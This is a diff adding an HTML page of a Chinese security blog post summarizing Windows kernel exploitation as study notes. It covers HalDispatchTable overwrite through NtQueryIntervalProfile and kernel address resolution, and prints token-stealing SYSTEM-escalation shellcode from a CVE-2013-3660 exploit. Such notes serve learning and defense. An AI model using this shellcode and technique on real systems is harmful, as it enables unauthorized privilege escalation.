@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>Windows内核漏洞利用小结 | DaJun的Blog | 脑袋空空</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="Windows Kernel">
+    <link rel="shortcut icon" href="/img/girl.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":true,"app_id":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","app_key":"Qn93YchF3LXlS54tbXjzMvAI","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","appkey":"Qn93YchF3LXlS54tbXjzMvAI","notify":true,"verify":true,"placeholder":"想说什么...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/girl.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DaJun</h5>
+          <a href="mailto:571986260@qq.com" title="571986260@qq.com" class="mail">
+            
+              <span>5</span>
+            
+              <span>7</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>8</span>
+            
+              <span>6</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/pwn-tips"  >
+                <i class="icon icon-lg icon-info"></i>
+                PWN TIPS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/todo"  >
+                <i class="icon icon-lg icon-clock-o"></i>
+                TODO
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/DayJun" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Windows内核漏洞利用小结</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/dawn.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Windows内核漏洞利用小结</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-06-11T11:14:16.000Z" itemprop="datePublished" class="page-time">
+  2020-06-11
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/学习日记/">学习日记</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-Windows内核漏洞利用小结"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Windows内核漏洞利用小结</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-06-11 19:14:16" datetime="2020-06-11T11:14:16.000Z"  itemprop="datePublished">2020-06-11</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/学习日记/">学习日记</a></li></ul>
+
+
+
+            
+	<span id="/2020/06/11/Windows内核漏洞利用小结/" class="leancloud_visitors" data-flag-title="Windows内核漏洞利用小结" title="Windows内核漏洞利用小结">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2020/06/11/Windows内核漏洞利用小结/#comment">
+            <span class="valine-comment-count" data-xid="/2020/06/11/Windows内核漏洞利用小结/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p>学习过程中总结以下Windows内核漏洞的基础</p>
+<a id="more"></a>
+
+<h1 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h1><p><code>NtQueryIntervalProfile = GetProcAddress(GetModuleHandle(&quot;ntdll&quot;), &quot;NtQueryIntervalProfile&quot;);</code></p>
+<p><code>nt!NtQueryIntervalProfile</code>用来<code>call HalDispatchTable+4</code>以控制程序执行流程</p>
+<p><code>NtQuerySystemInformation  = GetProcAddress(GetModuleHandle(&quot;ntdll&quot;), &quot;NtQuerySystemInformation&quot;);</code></p>
+<p><code>NtQuerySystemInformation</code>用来查询系统的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> &#123; SystemModuleInformation = <span class="number">11</span> &#125;;</span><br><span class="line">NtQuerySystemInformation(SystemModuleInformation, &amp;ModuleInfo, <span class="keyword">sizeof</span> ModuleInfo, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KernelHandle = LoadLibrary(ModuleInfo.Modules[<span class="number">0</span>].FullPathName + ModuleInfo.Modules[<span class="number">0</span>].OffsetToFileName);</span><br></pre></td></tr></table></figure>
+
+<p>这一步得到的<code>KernelHandle</code>可以看作是内核的句柄，也能看作是一个基地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HalDispatchTable = (ULONG) GetProcAddress(KernelHandle, <span class="string">"HalDispatchTable"</span>) - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[<span class="number">0</span>].ImageBase;</span><br><span class="line">PsInitialSystemProcess = (ULONG) GetProcAddress(KernelHandle, <span class="string">"PsInitialSystemProcess"</span>) - (ULONG)KernelHandle + (ULONG) ModuleInfo.Modules[<span class="number">0</span>].ImageBase;</span><br><span class="line">PsReferencePrimaryToken = (ULONG) GetProcAddress(KernelHandle, <span class="string">"PsReferencePrimaryToken"</span>) - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[<span class="number">0</span>].ImageBase;</span><br><span class="line">PsLookupProcessByProcessId = (ULONG) GetProcAddress(KernelHandle, <span class="string">"PsLookupProcessByProcessId"</span>) - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[<span class="number">0</span>].ImageBase;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>HalDispatchTable</code>是我们要覆写的地址-4，<code>PsInitialSystemProcess</code>是一个指针，其中存着指向<code>System Process</code>的<code>PEPROCESS</code>指针，<code>PsReferencePrimaryToken</code>函数为指定进程增加主令牌的引用计数，并返回指向给定进程的主要令牌的指针，<code>PsLookupProcessByProcessId</code>接受进程的进程ID，并返回指向该进程的EPROCESS结构的引用指针</p>
+<p>那么这里为什么要<code>GetProcAddress</code>之后再减去<code>KernelHandle</code>然后再加上<code>ModuleInfo.Modules[0].ImageBase</code>呢？</p>
+<p>这是因为，<code>LoadLibrary</code>导入的模块是属于当前进程的，并不属于内核，所以<code>GetProcAddress</code>后减去<code>KernelHandle</code>得到偏移，然后再加上<code>ModuleInfo.Modules[0].ImageBase</code>即内核基地址，才能得到相关函数在内核中的地址</p>
+<p>用<code>CVE-2013-3660</code>的<code>Shellcode</code>来说，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ULONG __<span class="function">stdcall <span class="title">ShellCode</span><span class="params">(DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID  TargetProcess;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Record that the exploit completed.</span></span><br><span class="line">    Finished = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fix the corrupted HalDispatchTable,</span></span><br><span class="line">    HalDispatchTable[<span class="number">1</span>] = HalQuerySystemInformation <span class="comment">//ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Find the EPROCESS structure for the process I want to escalate</span></span><br><span class="line">    <span class="keyword">if</span> (PsLookupProcessByProcessId(TargetPid, &amp;TargetProcess) == STATUS_SUCCESS) &#123;</span><br><span class="line">        PACCESS_TOKEN SystemToken;</span><br><span class="line">        PACCESS_TOKEN TargetToken;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the Token object for my target process, and the SYSTEM process.</span></span><br><span class="line">        TargetToken = (PACCESS_TOKEN) PsReferencePrimaryToken(TargetProcess);</span><br><span class="line">        SystemToken = (PACCESS_TOKEN) PsReferencePrimaryToken(*PsInitialSystemProcess);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the token in the target process, and replace with the system token.</span></span><br><span class="line">        FindAndReplaceMember((PDWORD) TargetProcess,</span><br><span class="line">                             (DWORD)  TargetToken,</span><br><span class="line">                             (DWORD)  SystemToken,</span><br><span class="line">                             <span class="number">0x200</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用内核态执行了用户态的shellcode代码，先用<code>PsLookupProcessByProcessId</code>得到当前进程，然后两个<code>PsReferencePrimaryToken</code>得到当前进程的token和System token，并将其交换</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FindAndReplaceMember</span><span class="params">(PDWORD Structure,</span></span></span><br><span class="line"><span class="function"><span class="params">                          DWORD CurrentValue,</span></span></span><br><span class="line"><span class="function"><span class="params">                          DWORD NewValue,</span></span></span><br><span class="line"><span class="function"><span class="params">                          DWORD MaxSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD i, Mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Microsoft QWORD aligns object pointers, then uses the lower three</span></span><br><span class="line">    <span class="comment">// bits for quick reference counting.</span></span><br><span class="line">    Mask = ~<span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Mask out the reference count.</span></span><br><span class="line">    CurrentValue &amp;= Mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Scan the structure for any occurrence of CurrentValue.</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MaxSize; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((Structure[i] &amp; Mask) == CurrentValue) &#123;</span><br><span class="line">            <span class="comment">// And finally, replace it with NewValue.</span></span><br><span class="line">            Structure[i] = NewValue;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Member not found.</span></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-06-11T11:50:33.560Z" itemprop="dateUpdated">2020-06-11 19:50:33</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2020/06/11/Windows内核漏洞利用小结/" target="_blank" rel="external">http://dayjun.top/2020/06/11/Windows内核漏洞利用小结/</a>
+        
+    </div>
+    <footer>
+        <a href="http://dayjun.top">
+            <img src="/img/girl.jpg" alt="DaJun">
+            DaJun
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows-Kernel/">Windows Kernel</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/06/11/Windows内核漏洞利用小结/&title=《Windows内核漏洞利用小结》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/06/11/Windows内核漏洞利用小结/&title=《Windows内核漏洞利用小结》 — DaJun的Blog&source=学习过程中总结以下Windows内核漏洞的基础" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2020/07/10/漏洞分析要点记录/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">漏洞分析要点记录</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2020/06/09/漏洞战争学习日记-5/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">漏洞战争学习日记(5)</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#任意地址写"><span class="post-toc-number">1.</span> <span class="post-toc-text">任意地址写</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://3nd.xyz/" target="_blank">3ND</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://blog.douluodalu.wang/" target="_blank">PwmHt</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                DaJun &copy; 2019 - 2020
+            </span>
+        		
+           	
+           	<span>
+           		<a href="http://www.beian.miit.gov.cn" target="_blank">苏ICP备19059861号</a>
+           	</span>
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/06/11/Windows内核漏洞利用小结/&title=《Windows内核漏洞利用小结》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/06/11/Windows内核漏洞利用小结/&title=《Windows内核漏洞利用小结》 — DaJun的Blog&source=学习过程中总结以下Windows内核漏洞的基础" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLklEQVR42u3a226EMAxFUf7/p6nU1xmifWyoirPzNOpQyGIkK74cB17n7/r8/HnN1ZXk2/X9b1gyZMh4LeNcrqtbX12z/nv6msjeZMiQsQ8jDbJkW2s8AZO9yZAhQwYJfCSk8o3KkCFDxl0Bl7P718iQIUMGT2J5IeyuEPxILi5DhowXMjqNgac//1F/Q4YMGf+YcZZWv21575IhQ8Zsxr3HvjRQrp/LmwQyZMjYjcHT1/45lI9roFcgQ4aMoQxy1OPBkQ9h8AEO9LJkyJAxmlF7WPoieIOhlgzLkCFjNuPpMS9SqlvnoehbGTJkbMYgaS0PxOlGi3eQIUPGaEZaUEsbmbWyXTGIy5AhYyijdos0gK7Deq2Z+uV3kCFDxmgGKX7Vgmb/PmiaQoYMGRsw0rBYay6mg62kVXDwA7AMGTJezki3zgfIaq8jTn1lyJAxmsFTTR4E+X36Af3LNTJkyBjKIA8gAxn3bjFtbcqQIWM2gyScR2Pxoh4fUEMYGTJkDGKQf0tbmOnBrnbcDDJsGTJkDGL0C17pcEatDIeSWBkyZAxi8EGHdZDlMTAIo+krkCFDxjjGGa5aQEzDa1zOkyFDxmhGWjLrHAR5GS5NbmXIkLEDI21PpofItIVZLOHJkCFjA0ZauOel/PS5xVxchgwZMhojEbVgmhbjZMiQIWNd4k+pJK2NJ9pkyJCxAYMkseRbPjZRK/3LkCFjT0baGEgDcTqE0TmMypAhYxzjB3RvLLqkDIpRAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.4"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.4"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '(～﹃～)~zZ';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(￣▽￣)';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+</body>
+</html>
